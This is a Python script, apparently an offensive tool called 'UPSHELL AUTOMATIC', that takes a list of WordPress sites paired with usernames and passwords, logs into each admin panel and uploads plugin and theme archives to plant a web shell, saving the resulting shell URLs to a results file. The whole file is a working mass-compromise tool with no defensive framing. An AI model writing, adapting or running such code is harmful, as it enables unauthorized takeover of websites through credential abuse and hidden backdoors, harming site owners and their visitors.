"""
Coded by: Latip176 (Updated with Colors for Success/Failure)
"""

import re, os
from datetime import datetime
from time import sleep

try:
    import requests
except ModuleNotFoundError:
    os.system("pip install requests")
    import requests
try:
    from bs4 import BeautifulSoup
except ModuleNotFoundError:
    os.system("pip install bs4")
    from bs4 import BeautifulSoup
try:
    from colorama import Fore, init
except ModuleNotFoundError:
    os.system("pip install colorama")
    from colorama import Fore, init

# Inisialisasi warna
init(autoreset=True)
fr = Fore.RED
fg = Fore.GREEN
fy = Fore.YELLOW

os.system("clear||cls")
cek_upload = []


def uploadShell(session, file: str = None, url: str = None, method: str = None):
    """
    Function to upload shell to target WordPress via plugin or theme method.
    Args:
        session: Request Session
        file: File Upload
        url: Url Target
        method: [plugin, theme]
    Returns:
        Results success or Failed
    """
    method = (
        "plugin-install.php"
        if method == "plugin"
        else "theme-install.php?browse=popular"
    )
    try:
        response = BeautifulSoup(
            session.get(f"https://{url}/wp-admin/{method}").text,
            "html.parser",
        )
    except:
        response = BeautifulSoup(
            session.get(f"http://{url}/wp-admin/{method}").text,
            "html.parser",
        )
    form = response.find(
        "form", {"enctype": "multipart/form-data", "class": "wp-upload-form"}
    )
    if form:
        data = {
            x.get("name"): x.get("value")
            for x in form.findAll("input", {"type": ["hidden", "submit"]})
        }
        files = {"pluginzip" if "plugin" in method else "themezip": open(file, "rb")}
        session.post(form.get("action"), data=data, files=files)
        location = file.split("/")[-1] if "/" in str(file) else file
        hasil = f"http://{url}/wp-content/{'plugins/plugin' if 'plugin' in method else 'themes/theme'}/class-autoload.php"
        cek_upload.append(hasil)
        open("results/shells.txt", "a").write(hasil + "\n")

        return f"{fg}SUCCESS: {hasil} {method}"
    else:
        return f"{fr}FAILED [input tidak ditemukan] {url} {method}"


def authenWordpress(url, username=None, password=None, file: str = None):
    """
    Function to try to log in to WordPress admin
    Args:
        url: Target Url
        username: Username
        password: Password
        file: [Optional] for manual target
    """
    with requests.Session() as session:
        data = {
            "log": username,
            "pwd": password,
            "wp-submit": "Log+In",
            "testcookie": "1",
        }
        try:
            post = session.post(
                f"https://{url}/wp-login.php",
                data=data,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": str(
                        len("&".join(f"{k}={v}" for k, v in data.items()))
                    ),
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
                },
                cookies={"wordpress_test_cookie": "WP+Cookie+check"},
            )
        except:
            post = session.post(
                f"http://{url}/wp-login.php",
                data=data,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": str(
                        len("&".join(f"{k}={v}" for k, v in data.items()))
                    ),
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
                },
                cookies={"wordpress_test_cookie": "WP+Cookie+check"},
            )
        if "wp-settings-" in str(post.cookies):
            print(f"{fg}[LOGIN SUCCESS] {url}")
            plugin = uploadShell(
                session=session, file="plugin.zip", url=url, method="plugin"
            )
            print(plugin)
            theme = uploadShell(
                session=session, file="theme.zip", url=url, method="theme"
            )
            return theme
        else:
            if "Error code 520" in post.text:
                return f"{fr}FAILED [cloudflare] {url}"
            elif "404 Not Found" in post.text:
                return f"{fr}FAILED [wp login not found] {url}"
            elif "login_error" in post.text:
                return f"{fr}FAILED [username atau password salah] {url}"
            return f"{fr}FAILED [link error atau kredensial salah] {url}"


if __name__ == "__main__":
    # mkdir folder
    try:
        os.mkdir("results")
    except:
        pass
    print(f"{fy}[UPSHELL AUTOMATIC BY SCANDALAUS]\n")
    try:
        results = input(" > File WP List: ")
        rH = open(results, "r").readlines()
    except:
        exit(f"{fr}File tidak ditemukan")

    for target in rH:
        url = re.findall(
            "https://(.*?)/" if "https" in target else "http://(.*?)/",
            str(target),
        )[0]
        target = target.replace("\n", "")
        target = target.split("#", 1)[-1]
        user, pw = target.split("@", 1)
        try:
            print(
                authenWordpress(url=url, username=user, password=pw)
            )
        except Exception as e:
            print(f"{fr}FAILED [link error atau sertifikat SSL bermasalah] {url} {e}")
